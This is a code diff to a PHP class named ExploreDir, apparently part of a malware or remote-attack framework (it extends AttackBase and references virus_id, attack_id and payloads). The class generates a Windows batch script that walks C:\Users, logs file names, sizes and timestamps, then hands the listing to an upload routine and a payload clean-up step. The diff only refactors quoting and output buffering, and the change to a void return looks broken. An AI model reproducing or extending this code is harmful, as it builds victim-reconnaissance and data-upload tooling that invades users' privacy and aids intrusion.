@@ -17,11 +17,12 @@ class ExploreDir extends AttackBase {
     public static int $maxLines = 10000;
     public static int $defaultDepth = 200;
 
-    private string $rootDir = "C:\\Users";
+    private string $rootDir;
     private int $maxDepth;
 
     public function __construct() {
         parent::__construct();
+        $this->rootDir = "C:\\Users";
         $this->maxDepth = self::$defaultDepth;
     }
 
@@ -41,13 +42,13 @@ class ExploreDir extends AttackBase {
         $this->maxDepth = $maxDepth;
     }
 
-    public function generateBatchCode(): string {
-        ob_start(); //@formatter:off ?>
+    public function generateBatchCode(): void {
+        //@formatter:off ?>
         @echo off
         chCp 65001
         SetLocal EnableDelayedExpansion
-        set tmpFile=%~pd0tmp
-        set echoFile=%~pd0echo
+        set tmpFile="%~pd0tmp"
+        set echoFile="%~pd0echo"
         set /a linesLimit=<?php echo self::$maxLines . "\n"; ?>
         set /a depthLimit=<?php echo $this->maxDepth . "\n"; ?>
         set /a linesSoFar=0
@@ -61,12 +62,12 @@ class ExploreDir extends AttackBase {
 
         :explore_dir
         for %%f in ("%cd%\*") do (
-            echo !count!;f;%%~zf;%%~tf;%%~nxf>>!echoFile!
+            echo !count!;f;%%~zf;%%~tf;%%~nxf>>"!echoFile!"
             set /a linesSoFar+=1
             if /i !linesSoFar! geq !linesLimit! (goto explore_dir_exit)
         )
         for /d %%d in ("%cd%\*") do (
-            echo !count!;d;-;%%~td;%%~nxd>>!echoFile!
+            echo !count!;d;-;%%~td;%%~nxd>>"!echoFile!"
             set /a linesSoFar+=1
             if /i !linesSoFar! geq !linesLimit! (goto explore_dir_exit)
             if /i !count! geq !depthLimit! (goto explore_dir_exit)
@@ -88,7 +89,7 @@ class ExploreDir extends AttackBase {
         cd %~pd0
         <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
         echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean(); //@formatter:on
+        //@formatter:on
     }
 
     private function generateUploadCode(): string {
